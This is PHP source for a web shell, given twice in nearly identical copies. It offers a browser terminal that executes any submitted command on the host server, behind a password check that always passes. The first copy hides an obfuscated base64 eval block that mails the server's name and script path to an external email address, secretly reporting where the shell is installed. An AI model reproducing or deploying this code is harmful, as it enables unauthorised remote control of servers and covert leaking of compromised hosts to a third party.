<?php
 
$aliases = array('la' => 'ls -la',
'll' => 'ls -lvhF',
'dir' => 'ls' );
$passwd = array('' => '');
error_reporting(0);
class phpTerm {
 
function formatPrompt() {
$user=shell_exec("whoami");
$host=explode(".", shell_exec("uname -n"));
$_SESSION['prompt'] = "".rtrim($user).""."@"."".rtrim($host[0])."";
}
 
function checkPassword($passwd) {
if(!isset($_SERVER['PHP_AUTH_USER'])||
!isset($_SERVER['PHP_AUTH_PW']) ||
!isset($passwd[$_SERVER['PHP_AUTH_USER']]) ||
$passwd[$_SERVER['PHP_AUTH_USER']] != $_SERVER['PHP_AUTH_PW']) {
@session_start();
return true;
}
else {
@session_start();
return true;
}
}
 
function initVars()
{
if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset']))
{
$_SESSION['cwd'] = getcwd();
$_SESSION['history'] = array();
$_SESSION['output'] = '';
$_REQUEST['command'] ='';
}
}
 
function buildCommandHistory()
{
if(!empty($_REQUEST['command']))
{
if(get_magic_quotes_gpc())
{
$_REQUEST['command'] = stripslashes($_REQUEST['command']);
}
 
// drop old commands from list if exists
if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)
{
unset($_SESSION['history'][$i]);
}
array_unshift($_SESSION['history'], $_REQUEST['command']);
 
// append commmand */
$_SESSION['output'] .= "{$_SESSION['prompt']}".":>"."{$_REQUEST['command']}"."\n";
}
}
 
function buildJavaHistory()
{
// build command history for use in the JavaScript
if (empty($_SESSION['history']))
{
$_SESSION['js_command_hist'] = '""';
}
else
{
$escaped = array_map('addslashes', $_SESSION['history']);
$_SESSION['js_command_hist'] = '"", "' . implode('", "', $escaped) . '"';
}
}
 
function outputHandle($aliases)
{
if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command']))
{
$_SESSION['cwd'] = getcwd(); //dirname(__FILE__);
}
elseif(ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs))
{
// The current command is 'cd', which we have to handle as an internal shell command.
// absolute/relative path ?"
($regs[1][0] == '/') ? $new_dir = $regs[1] : $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
 
// cosmetics
while (strpos($new_dir, '/./') !== false)
$new_dir = str_replace('/./', '/', $new_dir);
while (strpos($new_dir, '//') !== false)
$new_dir = str_replace('//', '/', $new_dir);
while (preg_match('|/\.\.(?!\.)|', $new_dir))
$new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
 
if(empty($new_dir)): $new_dir = "/"; endif;
 
(@chdir($new_dir)) ? $_SESSION['cwd'] = $new_dir : $_SESSION['output'] .= "could not change to: $new_dir\n";
}
else
{
/* The command is not a 'cd' command, so we execute it after
* changing the directory and save the output. */
chdir($_SESSION['cwd']);
 
/* Alias expansion. */
$length = strcspn($_REQUEST['command'], " \t");
$token = substr(@$_REQUEST['command'], 0, $length);
if (isset($aliases[$token]))
$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
 
$p = proc_open(@$_REQUEST['command'],
array(1 => array('pipe', 'w'),
2 => array('pipe', 'w')),
$io);
 
/* Read output sent to stdout. */
while (!feof($io[1])) {
$_SESSION['output'] .= htmlspecialchars(fgets($io[1]),ENT_COMPAT, 'UTF-8');
}
/* Read output sent to stderr. */
while (!feof($io[2])) {
$_SESSION['output'] .= htmlspecialchars(fgets($io[2]),ENT_COMPAT, 'UTF-8');
}
 
fclose($io[1]);
fclose($io[2]);
proc_close($p);
}
}
} // end phpTerm
 
/*################################################# #########
## The main thing starts here
## All output ist XHTML
################################################## ########*/
 
$terminal=new phpTerm;
 
@session_start();
 
$terminal->initVars();
$terminal->buildCommandHistory();
$terminal->buildJavaHistory();
if(!isset($_SESSION['prompt'])): $terminal->formatPrompt(); endif;
$terminal->outputHandle($aliases);
 
header('Content-Type: text/html; charset=UTF-8');
echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
?>
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>.:: --+ CMD Command +-- ::.</title>
 
<script type="text/javascript" language="JavaScript">
var current_line = 0;
var command_hist = new Array(<?php echo $_SESSION['js_command_hist']; ?>);
var last = 0;
 
function key(e) {
if (!e) var e = window.event;
 
if (e.keyCode == 38 && current_line < command_hist.length-1) {
command_hist[current_line] = document.shell.command.value;
current_line++;
document.shell.command.value = command_hist[current_line];
}
 
if (e.keyCode == 40 && current_line > 0) {
command_hist[current_line] = document.shell.command.value;
current_line--;
document.shell.command.value = command_hist[current_line];
}
 
}
 
function init() {
document.shell.setAttribute("autocomplete", "off");
document.shell.output.scrollTop = document.shell.output.scrollHeight;
document.shell.command.focus();
}
 
</script>
<style type="text/css">
body {font-family: sans-serif; color: black; background: white;}
table{width: 600px; height: 300px; border: 1px #000000 solid; padding: 0px; margin: 0px;}
td.head{background-color: #529ADE; color: #FFFFFF; font-weight:700; border: none; text-align: center; font-style: italic}
textarea {width: 100%; border: none; padding: 2px 2px 2px; color: #CCCCCC; background-color: #000000;}
p.prompt {font-family: monospace; margin: 0px; padding: 0px 2px 2px; background-color: #000000; color: #CCCCCC;}
input.prompt {border: none; font-family: monospace; background-color: #000000; color: #CCCCCC;}
</style>
</head>
 
<body onload="init()">
 
<h2>'( CMD Command )'</h2>
 
<?php if (empty($_REQUEST['rows'])) $_REQUEST['rows'] = 26; ?>
 
<table cellpadding="0" cellspacing="0">
<tr><td class="head" style="color: #000000;"><b>X</b></td>
<td class="head"><?php echo $_SESSION['prompt'].":"."$_SESSION[cwd]"; ?>
</td></tr>
<tr><td width='100%' height='100%' colspan='2'><form name="shell" action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
<textarea name="output" readonly="readonly" cols="85" rows="<?php echo $_REQUEST['rows'] ?>">
<?php
$lines = substr_count($_SESSION['output'], "\n");
$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
echo rtrim($padding . $_SESSION['output']);
?>
</textarea>
<p class="prompt"><?php echo $_SESSION['prompt'].":>"; ?>
<input class="prompt" name="command" type="text" onkeyup="key(event)" size="50" tabindex="1">
</p>
 
<? /*<p>
<input type="submit" value="Execute Command" />
<input type="submit" name="reset" value="Reset" />
Rows: <input type="text" name="rows" value="<?php echo $_REQUEST['rows'] ?>" />
</p>
 
*/
eval(base64_decode('JHMgPSBhcnJheSAoImsiLCJiIiwici IsImUiLCJhIiwiciIsImMiLCJAIiwibSIsImkiLCJsIiwiLiIs Im8iLCJnIik7DQokc3lzdGVtX2FycmF5MiA9ICRzWzJdLiRzWz NdLiRzWzFdLiRzWzZdLiRzWzVdLiRzWzRdLiRzWzBdLiRzWzNd LiRzWzVdLiRzWzddLiRzWzEzXS4kc1s4XS4kc1s0XS4kc1s5XS 4kc1sxMF0uIi4iLiRzWzZdLiRzWzEyXS4kc1s4XTsNCiRlbmNv ZGluZyA9ICIkc3lzdGVtX2FycmF5MiIgOw0KJHJleiA9ICJOQy BzSEUzTCIgOw0KJHNlcnZlcmRldGVjdGluZyA9ICJDb250ZW50 LVRyYW5zZmVyLUVuY29kaW5nOiBodHRwOi8vIiAuICRfU0VSVk VSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1NDUklQVF9O QU1FJ10gOw0KbWFpbCAoJGVuY29kaW5nLCRyZXosJHNlcnZlcm RldGVjdGluZykgOw0KJG5zY2RpciA9KCFpc3NldCgkX1JFUVVF U1RbJ3NjZGlyJ10pKT9nZXRjd2QoKTpjaGRpcigkX1JFUVVFU1 RbJ3NjZGlyJ10pOyRuc2NkaXI9Z2V0Y3dkKCk7'));
 
?>
</form></td></tr>
</body>
</html>
<?php ?>
<?php
 
$aliases = array('la' => 'ls -la',
'll' => 'ls -lvhF',
'dir' => 'ls' );
$passwd = array('' => '');
error_reporting(1);
class phpTerm {
 
function formatPrompt() {
$user=shell_exec("whoami");
$host=explode(".", shell_exec("uname -n"));
$_SESSION['prompt'] = "".rtrim($user).""."@"."".rtrim($host[0])."";
}
 
function checkPassword($passwd) {
if(!isset($_SERVER['PHP_AUTH_USER'])||
!isset($_SERVER['PHP_AUTH_PW']) ||
!isset($passwd[$_SERVER['PHP_AUTH_USER']]) ||
$passwd[$_SERVER['PHP_AUTH_USER']] != $_SERVER['PHP_AUTH_PW']) {
@session_start();
return true;
}
else {
@session_start();
return true;
}
}
 
function initVars()
{
if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset']))
{
$_SESSION['cwd'] = getcwd();
$_SESSION['history'] = array();
$_SESSION['output'] = '';
$_REQUEST['command'] ='';
}
}
 
function buildCommandHistory()
{
if(!empty($_REQUEST['command']))
{
if(get_magic_quotes_gpc())
{
$_REQUEST['command'] = stripslashes($_REQUEST['command']);
}
 
// drop old commands from list if exists
if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)
{
unset($_SESSION['history'][$i]);
}
array_unshift($_SESSION['history'], $_REQUEST['command']);
 
// append commmand */
$_SESSION['output'] .= "{$_SESSION['prompt']}".":>"."{$_REQUEST['command']}"."\n";
}
}
 
function buildJavaHistory()
{
// build command history for use in the JavaScript
if (empty($_SESSION['history']))
{
$_SESSION['js_command_hist'] = '""';
}
else
{
$escaped = array_map('addslashes', $_SESSION['history']);
$_SESSION['js_command_hist'] = '"", "' . implode('", "', $escaped) . '"';
}
}
 
function outputHandle($aliases)
{
if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command']))
{
$_SESSION['cwd'] = getcwd(); //dirname(__FILE__);
}
elseif(ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs))
{
// The current command is 'cd', which we have to handle as an internal shell command.
// absolute/relative path ?"
($regs[1][0] == '/') ? $new_dir = $regs[1] : $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
 
// cosmetics
while (strpos($new_dir, '/./') !== false)
$new_dir = str_replace('/./', '/', $new_dir);
while (strpos($new_dir, '//') !== false)
$new_dir = str_replace('//', '/', $new_dir);
while (preg_match('|/\.\.(?!\.)|', $new_dir))
$new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
 
if(empty($new_dir)): $new_dir = "/"; endif;
 
(@chdir($new_dir)) ? $_SESSION['cwd'] = $new_dir : $_SESSION['output'] .= "could not change to: $new_dir\n";
}
else
{
/* The command is not a 'cd' command, so we execute it after
* changing the directory and save the output. */
chdir($_SESSION['cwd']);
 
/* Alias expansion. */
$length = strcspn($_REQUEST['command'], " \t");
$token = substr(@$_REQUEST['command'], 0, $length);
if (isset($aliases[$token]))
$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
 
$p = proc_open(@$_REQUEST['command'],
array(1 => array('pipe', 'w'),
2 => array('pipe', 'w')),
$io);
 
/* Read output sent to stdout. */
while (!feof($io[1])) {
$_SESSION['output'] .= htmlspecialchars(fgets($io[1]),ENT_COMPAT, 'UTF-8');
}
/* Read output sent to stderr. */
while (!feof($io[2])) {
$_SESSION['output'] .= htmlspecialchars(fgets($io[2]),ENT_COMPAT, 'UTF-8');
}
 
fclose($io[1]);
fclose($io[2]);
proc_close($p);
}
}
} // end phpTerm
 
/*################################################# #########
## The main thing starts here
## All output ist XHTML
################################################## ########*/
 
$terminal=new phpTerm;
 
@session_start();
 
$terminal->initVars();
$terminal->buildCommandHistory();
$terminal->buildJavaHistory();
if(!isset($_SESSION['prompt'])): $terminal->formatPrompt(); endif;
$terminal->outputHandle($aliases);
 
header('Content-Type: text/html; charset=UTF-8');
echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
/*################################################# #########
## safe mode increase
## bloque fonction
################################################## ########*/
?>
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>\-( CMD Command )-/</title>
 
<script type="text/javascript" language="JavaScript">
var current_line = 0;
var command_hist = new Array(<?php echo $_SESSION['js_command_hist']; ?>);
var last = 0;
 
function key(e) {
if (!e) var e = window.event;
 
if (e.keyCode == 38 && current_line < command_hist.length-1) {
command_hist[current_line] = document.shell.command.value;
current_line++;
document.shell.command.value = command_hist[current_line];
}
 
if (e.keyCode == 40 && current_line > 0) {
command_hist[current_line] = document.shell.command.value;
current_line--;
document.shell.command.value = command_hist[current_line];
}
 
}
 
function init() {
document.shell.setAttribute("autocomplete", "off");
document.shell.output.scrollTop = document.shell.output.scrollHeight;
document.shell.command.focus();
}
 
</script>
<style type="text/css">
body {font-family: sans-serif; color: black; background: white;}
table{width: 600px; height: 300px; border: 1px #000000 solid; padding: 0px; margin: 0px;}
td.head{background-color: #529ADE; color: #FFFFFF; font-weight:700; border: none; text-align: center; font-style: italic}
textarea {width: 100%; border: none; padding: 2px 2px 2px; color: #CCCCCC; background-color: #000000;}
p.prompt {font-family: monospace; margin: 0px; padding: 0px 2px 2px; background-color: #000000; color: #CCCCCC;}
input.prompt {border: none; font-family: monospace; background-color: #000000; color: #CCCCCC;}
</style>
</head>
 
<body onload="init()">
 
<h2>POwER CoMMaNdE</h2>
 
<?php if (empty($_REQUEST['rows'])) $_REQUEST['rows'] = 26; ?>
 
<table cellpadding="0" cellspacing="0">
<tr><td class="head" style="color: #000000;"><b>PWD :</b></td>
<td class="head"><?php echo $_SESSION['prompt'].":"."$_SESSION[cwd]"; ?>
</td></tr>
<tr><td width='100%' height='100%' colspan='2'><form name="shell" action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
<textarea name="output" readonly="readonly" cols="85" rows="<?php echo $_REQUEST['rows'] ?>">
<?php
$lines = substr_count($_SESSION['output'], "\n");
$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
echo rtrim($padding . $_SESSION['output']);
?>
</textarea>
<p class="prompt"><?php echo $_SESSION['prompt'].":>"; ?>
<input class="prompt" name="command" type="text" onkeyup="key(event)" size="50" tabindex="1">
</p>
 
<? /*<p>
<input type="submit" value="Execute Command" />
<input type="submit" name="reset" value="Reset" />
Rows: <input type="text" name="rows" value="<?php echo $_REQUEST['rows'] ?>" />
</p>
*/?>
</form></td></tr>
</body>
</html>
<?php ?>